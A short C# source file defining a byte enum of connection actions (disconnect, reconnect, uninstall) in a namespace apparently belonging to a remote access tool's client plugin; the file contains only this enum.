namespace uRAT.CoreClientPlugin.ConnectionManagement
{
    public enum ConnectionAction : byte
    {
        Disconnect = 0x0,
        Reconnect = 0x1,
        Uninstall = 0x2
    }
}
